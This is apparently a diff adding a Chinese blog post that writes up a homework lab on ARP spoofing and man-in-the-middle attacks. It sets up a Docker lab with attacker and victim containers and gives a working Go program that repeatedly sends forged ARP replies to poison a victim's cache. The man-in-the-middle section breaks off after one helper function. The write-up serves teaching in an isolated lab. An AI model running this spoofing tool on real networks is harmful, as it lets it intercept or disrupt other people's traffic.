@@ -1,0 +1,467 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <link rel="icon" href='https://static.dionysus.zip/static/favicon.ico' type="image/x-icon">
+    <title>arp欺骗和中间人攻击 - MoonlitSyntax</title>
+
+    <link rel="stylesheet" href='https://static.dionysus.zip/static/css/app-GERNH3ZV.css'>
+
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+</head>
+
+<body class="l-body">
+
+<nav class="c-nav">
+    <a href="/" class="c-nav__link">首页</a>
+    <a href="/archives" class="c-nav__link">归档</a>
+    <a href="/tags" class="c-nav__link">标签</a>
+    <a href="/categories" class="c-nav__link">分类</a>
+    <a href="/links" class="c-nav__link">友链</a>
+    <a href="/about" class="c-nav__link">关于</a>
+    <button id="search-button" class="c-nav__search-btn">
+        <i class="fas fa-search"></i>
+    </button>
+</nav>
+
+
+<div class="l-container">
+    <div class="l-nav-spacer"></div>
+    <main class="l-main">
+        
+<div class="c-post">
+    <aside class="c-post__toc">
+        <h2 class="c-post__toc-title">目录</h2>
+        
+        <ol class="c-post__toc-list" id="toc-list"></ol>
+        
+    </aside>
+    <div class="c-post__main">
+        <header class="c-post__header">
+            <h1 class="c-post__title">arp欺骗和中间人攻击</h1>
+            <div class="c-post__meta">
+                <span class="c-post__meta-create"><i class="fas fa-calendar-plus"></i> 创建：2025-05-16 01:51</span>
+                <span class="c-post__meta-updated"><i class="fas fa-calendar-check"></i> 更新：2025-05-16 01:51</span>
+                <span class="c-post__meta-category"><i class="fas fa-folder-open"></i> 分类：<a href="/categories/funny"><strong>funny</strong></a></span>
+            </div>
+            <div class="c-post__tags">
+                <a href="/tags/%e6%9d%82" class="c-post__tag">#杂</a>
+            </div>
+            <div class="c-post__description">
+                arp欺骗和中间人攻击
+            </div>
+        </header>
+
+        <article class="c-post__content prose"><p>半夜发现还有个作业没写, 课件好像是用c写的, 这里直接用go实现了</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">bash</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="bash"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">apt install iproute2
+</span></span><span class="line"><span class="cl">apt install net-tools
+</span></span><span class="line"><span class="cl">apt install inetutils-ping
+</span></span></code></pre></div></div><p>先配置好docker</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">yml</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="yml"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="nt">services</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">attacker</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">build</span><span class="p">:</span><span class="w"> </span><span class="l">.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">networks</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">testnet</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">ipv4_address</span><span class="p">:</span><span class="w"> </span><span class="m">172.20.0.66</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">cap_add</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="l">NET_RAW</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span>- <span class="l">NET_ADMIN</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">tty</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">victim1</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">ubuntu:latest</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">networks</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">testnet</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">ipv4_address</span><span class="p">:</span><span class="w"> </span><span class="m">172.20.0.101</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">tty</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">victim2</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">ubuntu:latest</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">networks</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">testnet</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">ipv4_address</span><span class="p">:</span><span class="w"> </span><span class="m">172.20.0.102</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">tty</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">networks</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">testnet</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">driver</span><span class="p">:</span><span class="w"> </span><span class="l">bridge</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">ipam</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">config</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span>- <span class="nt">subnet</span><span class="p">:</span><span class="w"> </span><span class="m">172.20.0.0</span><span class="l">/24</span><span class="w">
+</span></span></span></code></pre></div></div><h2 id="实验一-arp欺骗">实验一 arp欺骗</h2>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">go</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="go"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;flag&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;fmt&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;github.com/google/gopacket&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;github.com/google/gopacket/layers&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;github.com/google/gopacket/pcap&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;log&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;net&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;os&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;time&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">getLocalInfo</span><span class="p">(</span><span class="nx">ifaceName</span> <span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="nx">net</span><span class="p">.</span><span class="nx">HardwareAddr</span><span class="p">,</span> <span class="nx">net</span><span class="p">.</span><span class="nx">IP</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">iface</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">net</span><span class="p">.</span><span class="nf">InterfaceByName</span><span class="p">(</span><span class="nx">ifaceName</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">err</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">addrs</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">iface</span><span class="p">.</span><span class="nf">Addrs</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">err</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">addr</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">addrs</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">ipnet</span><span class="p">,</span> <span class="nx">ok</span> <span class="o">:=</span> <span class="nx">addr</span><span class="p">.(</span><span class="o">*</span><span class="nx">net</span><span class="p">.</span><span class="nx">IPNet</span><span class="p">);</span> <span class="nx">ok</span> <span class="o">&amp;&amp;</span> <span class="p">!</span><span class="nx">ipnet</span><span class="p">.</span><span class="nx">IP</span><span class="p">.</span><span class="nf">IsLoopback</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="nx">ipnet</span><span class="p">.</span><span class="nx">IP</span><span class="p">.</span><span class="nf">To4</span><span class="p">()</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="nx">iface</span><span class="p">.</span><span class="nx">HardwareAddr</span><span class="p">,</span> <span class="nx">ipnet</span><span class="p">.</span><span class="nx">IP</span><span class="p">,</span> <span class="kc">nil</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Errorf</span><span class="p">(</span><span class="s">&#34;未找到有效 IPv4 地址&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 发送 ARP 回复欺骗包
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">func</span> <span class="nf">sendARPReply</span><span class="p">(</span><span class="nx">ifaceName</span> <span class="kt">string</span><span class="p">,</span> <span class="nx">attackerMAC</span> <span class="nx">net</span><span class="p">.</span><span class="nx">HardwareAddr</span><span class="p">,</span> <span class="nx">spoofedIP</span> <span class="nx">net</span><span class="p">.</span><span class="nx">IP</span><span class="p">,</span> <span class="nx">victimIP</span> <span class="nx">net</span><span class="p">.</span><span class="nx">IP</span><span class="p">,</span> <span class="nx">victimMAC</span> <span class="nx">net</span><span class="p">.</span><span class="nx">HardwareAddr</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">handle</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">pcap</span><span class="p">.</span><span class="nf">OpenLive</span><span class="p">(</span><span class="nx">ifaceName</span><span class="p">,</span> <span class="mi">65536</span><span class="p">,</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">pcap</span><span class="p">.</span><span class="nx">BlockForever</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">defer</span> <span class="nx">handle</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">e</span> <span class="o">:=</span> <span class="nx">layers</span><span class="p">.</span><span class="nx">Ethernet</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">SrcMAC</span><span class="p">:</span>       <span class="nx">attackerMAC</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">DstMAC</span><span class="p">:</span>       <span class="nx">victimMAC</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">EthernetType</span><span class="p">:</span> <span class="nx">layers</span><span class="p">.</span><span class="nx">EthernetTypeARP</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">a</span> <span class="o">:=</span> <span class="nx">layers</span><span class="p">.</span><span class="nx">ARP</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">AddrType</span><span class="p">:</span>          <span class="nx">layers</span><span class="p">.</span><span class="nx">LinkTypeEthernet</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">Protocol</span><span class="p">:</span>          <span class="nx">layers</span><span class="p">.</span><span class="nx">EthernetTypeIPv4</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">HwAddressSize</span><span class="p">:</span>     <span class="mi">6</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">ProtAddressSize</span><span class="p">:</span>   <span class="mi">4</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">Operation</span><span class="p">:</span>         <span class="nx">layers</span><span class="p">.</span><span class="nx">ARPReply</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">SourceHwAddress</span><span class="p">:</span>   <span class="p">[]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">attackerMAC</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">SourceProtAddress</span><span class="p">:</span> <span class="nx">spoofedIP</span><span class="p">.</span><span class="nf">To4</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">DstHwAddress</span><span class="p">:</span>      <span class="p">[]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">victimMAC</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">DstProtAddress</span><span class="p">:</span>    <span class="nx">victimIP</span><span class="p">.</span><span class="nf">To4</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">spoofedIP</span><span class="p">.</span><span class="nf">To4</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">victimIP</span><span class="p">.</span><span class="nf">To4</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="nx">buf</span> <span class="o">:=</span> <span class="nx">gopacket</span><span class="p">.</span><span class="nf">NewSerializeBuffer</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">opts</span> <span class="o">:=</span> <span class="nx">gopacket</span><span class="p">.</span><span class="nx">SerializeOptions</span><span class="p">{}</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">gopacket</span><span class="p">.</span><span class="nf">SerializeLayers</span><span class="p">(</span><span class="nx">buf</span><span class="p">,</span> <span class="nx">opts</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">e</span><span class="p">,</span> <span class="o">&amp;</span><span class="nx">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="nx">err</span> <span class="o">:=</span> <span class="nx">handle</span><span class="p">.</span><span class="nf">WritePacketData</span><span class="p">(</span><span class="nx">buf</span><span class="p">.</span><span class="nf">Bytes</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;发送失败：&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;已发送 ARP 欺骗包&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="nx">time</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">iface</span> <span class="o">:=</span> <span class="nx">flag</span><span class="p">.</span><span class="nf">String</span><span class="p">(</span><span class="s">&#34;i&#34;</span><span class="p">,</span> <span class="s">&#34;eth0&#34;</span><span class="p">,</span> <span class="s">&#34;网卡名&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">spoofIP</span> <span class="o">:=</span> <span class="nx">flag</span><span class="p">.</span><span class="nf">String</span><span class="p">(</span><span class="s">&#34;s&#34;</span><span class="p">,</span> <span class="s">&#34;192.168.1.1&#34;</span><span class="p">,</span> <span class="s">&#34;伪造的源 IP&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">victimIP</span> <span class="o">:=</span> <span class="nx">flag</span><span class="p">.</span><span class="nf">String</span><span class="p">(</span><span class="s">&#34;v&#34;</span><span class="p">,</span> <span class="s">&#34;192.168.1.101&#34;</span><span class="p">,</span> <span class="s">&#34;目标主机 IP&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">victimMAC</span> <span class="o">:=</span> <span class="nx">flag</span><span class="p">.</span><span class="nf">String</span><span class="p">(</span><span class="s">&#34;m&#34;</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="s">&#34;目标主机 MAC 地址&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">flag</span><span class="p">.</span><span class="nf">Parse</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="o">*</span><span class="nx">victimMAC</span> <span class="o">==</span> <span class="s">&#34;&#34;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;必须提供目标主机 MAC 地址（-m）&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">os</span><span class="p">.</span><span class="nf">Exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">mac</span><span class="p">,</span> <span class="nx">ip</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">getLocalInfo</span><span class="p">(</span><span class="o">*</span><span class="nx">iface</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="s">&#34;无法获取本机信息:&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;本机 MAC: %s, IP: %s\n&#34;</span><span class="p">,</span> <span class="nx">mac</span><span class="p">,</span> <span class="nx">ip</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">targetMAC</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">net</span><span class="p">.</span><span class="nf">ParseMAC</span><span class="p">(</span><span class="o">*</span><span class="nx">victimMAC</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="s">&#34;目标 MAC 地址格式错误&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nf">sendARPReply</span><span class="p">(</span><span class="o">*</span><span class="nx">iface</span><span class="p">,</span> <span class="nx">mac</span><span class="p">,</span> <span class="nx">net</span><span class="p">.</span><span class="nf">ParseIP</span><span class="p">(</span><span class="o">*</span><span class="nx">spoofIP</span><span class="p">),</span> <span class="nx">net</span><span class="p">.</span><span class="nf">ParseIP</span><span class="p">(</span><span class="o">*</span><span class="nx">victimIP</span><span class="p">),</span> <span class="nx">targetMAC</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250516023054.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250516023054.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<p>网关IP <code>172.20.0.1</code>
+网关MAC <code>02:42:60:c2:7d:01</code></p>
+<p>Victim1 运行后</p>
+<p><div class="c-img" data-full="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250516023253.png"><div class="c-img__ph"><div class="c-spinner"></div></div><img src="https://static.dionysus.zip/static/z-img/Pasted%20image%2020250516023253.png" alt="" loading="lazy" decoding="async" referrerpolicy="no-referrer" class="c-img__img"></div></p>
+<h2 id="实验二-arp中间人攻击">实验二 ARP中间人攻击</h2>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">go</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="go"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;context&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;flag&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;fmt&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;github.com/google/gopacket&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;github.com/google/gopacket/layers&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;github.com/google/gopacket/pcap&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;log&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;net&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;os/exec&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;strings&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;time&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 获取本机网卡的第一个非回环 IPv4 地址和 MAC
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">func</span> <span class="nf">getLocalInfo</span><span class="p">(</span><span class="nx">ifaceName</span> <span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="nx">net</span><span class="p">.</span><span class="nx">HardwareAddr</span><span class="p">,</span> <span class="nx">net</span><span class="p">.</span><span class="nx">IP</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">iface</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">net</span><span class="p">.</span><span class="nf">InterfaceByName</span><span class="p">(</span><span class="nx">ifaceName</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">err</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">addrs</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">iface</span><span class="p">.</span><span class="nf">Addrs</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">err</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">addr</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">addrs</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="nx">ipnet</span><span class="p">,</span> <span class="nx">ok</span> <span class="o">:=</span> <span class="nx">addr</span><span class="p">.(</span><span class="o">*</span><span class="nx">net</span><span class="p">.</span><span class="nx">IPNet</span><span class="p">);</span> <span class="nx">ok</span> <span class="o">&amp;&amp;</span> <span class="p">!</span><span class="nx">ipnet</span><span class="p">.</span><span class="nx">IP</span><span class="p">.</span><span class="nf">IsLoopback</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="nx">ipnet</span><span class="p">.</span><span class="nx">IP</span><span class="p">.</span><span class="nf">To4</span><span class="p">()</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="nx">iface</span><span class="p">.</span><span class="nx">HardwareAddr</span><span class="p">,</span> <span class="nx">ipnet</span><span class="p">.</span><span class="nx">IP</span><span class="p">,</span> <span class="kc">nil</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Errorf</span><span class="p">(</span><span class="s">&#34;未找到有效 IPv4 地址&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
